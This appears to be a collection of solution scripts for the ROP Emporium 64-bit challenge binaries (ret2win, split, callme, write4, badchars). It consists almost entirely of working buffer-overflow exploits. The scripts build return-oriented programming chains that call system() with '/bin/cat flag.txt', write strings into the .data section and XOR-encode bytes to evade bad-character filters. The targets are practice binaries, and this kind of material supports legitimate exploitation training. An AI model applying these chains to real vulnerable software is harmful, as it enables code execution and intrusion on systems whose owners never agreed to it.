

### target

    https://ropemporium.com/ (64bit binaries)

### ret2win

    python2 -c 'import struct; print "A"*40 + struct.pack("<Q", 0x0000000000400811)' | ./ret2win

### split

```
cat > split.py <<EOF
#! /usr/bin/env python2

import os
import sys
import socket
import struct
import telnetlib

### generic utilities

### specific data & functions

def rop():
    return "".join([
    struct.pack("<Q", 0x0000000000400883), # pop rdi ; ret
    struct.pack("<Q", 0x601060), # '/bin/cat flag.txt' location
    struct.pack("<Q", 0x400810) # call system()
    ])

payload = "A" * 40 + rop()

callme = os.popen('./split', 'w')
callme.write(payload)
EOF
```

### callme

```
cat > callme.py <<EOF
#! /usr/bin/env python2

import os
import sys
import socket
import struct
import telnetlib

### generic utilities

### specific data & functions

def prepParams():
    return "".join([
    ])

def prepParams():
    return "".join([
    struct.pack("<Q", 0x0000000000401ab0), # pop rdi ; pop rsi ; pop rdx ; ret
    struct.pack("<Q", 0x1),
    struct.pack("<Q", 0x2),
    struct.pack("<Q", 0x3)
    ])

payload = "A" * 40 + \
           prepParams() + struct.pack("<Q", 0x401850) + \
           prepParams() + struct.pack("<Q", 0x401870) + \
           prepParams() + struct.pack("<Q", 0x401810)

callme = os.popen('./callme', 'w')
callme.write(payload)
EOF
```

### write4

```
cat > write4.py <<EOF
#! /usr/bin/env python2

import os
import sys
import socket
import struct
import telnetlib

### generic utilities

### specific data & functions

# address to write string to (beginning of .data section)
dest_addr = 0x601050

def callSystem(cmd_addr):
    return "".join([
    struct.pack("<Q", 0x0000000000400893), # pop rdi ; ret
    struct.pack("<Q", cmd_addr),
    struct.pack("<Q", 0x4005e0)
    ])

def write8(toAddr, value):
    return "".join([
    struct.pack("<Q", 0x400890), # pop r14 ; pop r15 ; ret
    struct.pack("<Q", toAddr),
    value,
    struct.pack("<Q", 0x400820), # mov qword ptr [r14], r15 ; ret
    ])

def writeString(toAddr, string):

    rop=""

    # use 'write8' primitive
    primUsed = 8

    # calculate number of iterations needed
    iterations = len(string) / primUsed

    # write 'primUsed' long part of the 'string' at a time starting at 'toAddr' location
    for i in xrange(iterations):
        chunk = string[i*primUsed:i*primUsed + primUsed]
        rop += write8(toAddr + i*primUsed, chunk)

    return rop

payload = "A" * 40 + writeString(dest_addr, '/bin/cat flag.txt\0\0\0\0\0\0\0') + callSystem(dest_addr)

callme = os.popen('./write4', 'w')
callme.write(payload)
EOF
```

### badchars

```
cat > badchars.py <<EOF
#! /usr/bin/env python2

import os
import sys
import socket
import struct
import telnetlib

### generic utilities

### specific data & functions

# do no use chars: b i c / <space> f n s
# $ ropper -b '626963666e7320' --file ./badchars

# cmd to execute
#cmd = 'cat flag.txt\0\0\0\0'
cmd = '/bin/cat flag.txt\0\0\0\0\0\0\0'

# badchars
badchars = "bic/ fns"

# address to write string to (begins at 4th byte of .data section to avoid addressing 0x601073 location which contains badchar '0x73')
dest_addr = 0x601074

def callSystem(cmd_addr):
    return "".join([
    struct.pack("<Q", 0x0000000000400b39), # pop rdi ; ret
    struct.pack("<Q", cmd_addr),
    struct.pack("<Q", 0x4006f0)
    ])

def write8(toAddr, value):
    return "".join([
    struct.pack("<Q", 0x400b3b), # pop r12 ; pop r13 ; ret
    value,
    struct.pack("<Q", toAddr),
    struct.pack("<Q", 0x400b34), # mov qword ptr [r13], r12 ; ret
    ])

def writeString(toAddr, string):

    rop=""

    # use 'write8' primitive
    primUsed = 8

    # calculate number of iterations needed
    iterations = len(string) / primUsed

    # write 'primUsed' long part of the 'string' at a time starting at 'toAddr' location
    for i in xrange(iterations):
        chunk = string[i*primUsed:i*primUsed + primUsed]
        rop += write8(toAddr + i*primUsed, chunk)

    return rop

def unmangleChar(c, addr):
    mask = 0xeb
    x = ord(c) ^ mask

    return "".join([
    struct.pack("<Q", 0x0000000000400b40), # pop r14 ; pop r15 ; ret
    struct.pack("<Q", x),
    struct.pack("<Q", addr),
    struct.pack("<Q", 0x0000000000400b30) # xor byte ptr [r15], r14b ; ret
    ])

def postprocString(str_addr, string, badchars):
    i=0
    rop=""

    for c in string:
        print hex(str_addr + i)
        if c in badchars:
            rop += unmangleChar(c, str_addr + i)
        i+=1

    return rop

# write provided string at 'dest_addr' location (begining of .data)
rop1 = writeString(dest_addr, cmd)

# deals with a list of provided bad characters in a string
rop2 = postprocString(dest_addr, cmd, badchars)

payload = "A" * 40 + rop1 + rop2 + callSystem(dest_addr)
#payload = rop1 + rop2 + callSystem(dest_addr)

callme = os.popen('./badchars', 'w')
callme.write(payload)

# write payload to a file:
#f = open("badchars_payload", "w")
#f.write(payload)
#f.close()
EOF
```
